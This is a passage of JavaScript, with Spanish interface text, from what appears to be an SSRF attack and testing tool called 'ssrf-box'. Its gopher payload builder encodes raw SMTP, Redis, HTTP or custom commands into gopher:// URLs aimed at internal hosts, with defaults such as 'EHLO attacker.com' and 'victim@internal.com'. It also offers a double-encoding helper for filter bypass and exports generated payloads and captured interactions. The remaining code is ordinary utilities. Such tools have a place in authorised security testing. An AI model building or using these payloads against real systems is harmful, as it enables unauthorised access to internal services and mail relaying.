  const to    = document.getElementById('g-smtp-to').value.trim()    || 'victim@internal.com';
  const subj  = document.getElementById('g-smtp-subj').value.trim()  || 'SSRF Test';
  const body  = document.getElementById('g-smtp-body').value.trim()  || 'Test.';
  return (
    `EHLO attacker.com\r\n` +
    `MAIL FROM:<${from}>\r\n` +
    `RCPT TO:<${to}>\r\n` +
    `DATA\r\n` +
    `Subject: ${subj}\r\n\r\n` +
    `${body}\r\n.\r\nQUIT\r\n`
  );
}

function gopherEncode(str) {
  const bytes = new TextEncoder().encode(str);
  let out = '';
  for (const b of bytes) out += '%' + b.toString(16).padStart(2, '0').toUpperCase();
  return out;
}

function buildGopher() {
  const host  = document.getElementById('g-host').value.trim()  || '127.0.0.1';
  const port  = document.getElementById('g-port').value.trim()  || '80';
  const proto = document.getElementById('g-proto').value;

  let raw = '';
  switch (proto) {
    case 'redis':  raw = buildRedisPayload(); break;
    case 'http':   raw = buildHTTPPayload();  break;
    case 'smtp':   raw = buildSMTPPayload();  break;
    case 'custom': {
      const r = document.getElementById('g-raw').value;
      raw = r.replace(/\\r\\n/g, '\r\n').replace(/\\n/g, '\n');
      break;
    }
  }

  if (!raw) { showToast('Payload vacío'); return; }

  currentGopherURL = `gopher://${host}:${port}/_${gopherEncode(raw)}`;
  document.getElementById('g-url').textContent = currentGopherURL;
  document.getElementById('g-output').classList.remove('hidden');
}

function copyDoubleEncoded() {
  copyText(currentGopherURL.replace(/%/g, '%25'));
}

// ── Export ─────────────────────────────────────────────────────────────────
async function exportJSON() {
  const data = searchMode ? searchResults : filteredInteractions;
  downloadBlob(new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' }), `ssrf-box-${Date.now()}.json`);
}

async function exportCSV() {
  const uuid = document.getElementById('filter-uuid').value.trim();
  const type = document.getElementById('filter-type').value;
  let url = '/api/export?';
  if (uuid) url += 'uuid=' + encodeURIComponent(uuid) + '&';
  if (type) url += 'type=' + encodeURIComponent(type);
  const resp = await apiFetch(url);
  downloadBlob(await resp.blob(), `ssrf-box-${Date.now()}.csv`);
}

function exportPayloadsAsTxt() {
  if (!currentPayloads.length) { showToast('No hay payloads generados'); return; }
  const lines = currentPayloads.map(p => p.payload).join('\n');
  downloadBlob(new Blob([lines], { type: 'text/plain' }), `payloads-${Date.now()}.txt`);
}

function downloadBlob(blob, filename) {
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  a.click();
}

// ── Utils ──────────────────────────────────────────────────────────────────
function jsonHighlight(json) {
  const escaped = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  return escaped.replace(
    /("(?:\\.|[^"\\])*"(?:\s*:)?|true|false|null|-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)/g,
    (token) => {
      if (token.endsWith(':')) return `<span class="json-key">${token}</span>`;
      if (token.startsWith('"'))  return `<span class="json-str">${token}</span>`;
      if (token === 'true' || token === 'false') return `<span class="json-bool">${token}</span>`;
      if (token === 'null') return `<span class="json-null">${token}</span>`;
      return `<span class="json-num">${token}</span>`;
    }
  );
}

function relativeTime(date) {
  const diff = Math.floor((Date.now() - date) / 1000);
  if (diff < 30)   return 'ahora';
  if (diff < 60)   return `${diff}s`;
  if (diff < 3600) return `hace ${Math.floor(diff/60)}m`;
  if (diff < 86400) return `hace ${Math.floor(diff/3600)}h`;
  return `hace ${Math.floor(diff/86400)}d`;
}

function truncate(s, n) {
  if (!s) return '';
  return s.length > n ? s.slice(0, n) + '…' : s;
}

function escHtml(s) {
  return String(s || '')
    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function tryParseJSON(s) {
  if (!s) return null;
  try { return JSON.parse(s); } catch (_) { return s; }
}

function copyText(text) {
  navigator.clipboard.writeText(text).then(() => showToast('Copiado'));
}

function showToast(msg) {
  const toast = document.createElement('div');
  toast.className = 'toast';
  toast.textContent = msg;
  document.body.appendChild(toast);
  setTimeout(() => toast.remove(), 2000);
}

// ── Init ───────────────────────────────────────────────────────────────────
gopherRedisChange(); // pre-populate Redis template fields on load

function updateRelativeTimes() {
  document.querySelectorAll('.interaction-time[data-ts]').forEach(el => {
    el.textContent = relativeTime(new Date(parseInt(el.dataset.ts, 10)));
  });
}
setInterval(updateRelativeTimes, 30000);

if (apiKey) {
  bootstrap();
} else {
  document.getElementById('api-key-input').focus();
  document.getElementById('api-key-input').addEventListener('keydown', e => {
    if (e.key === 'Enter') login();
  });
}
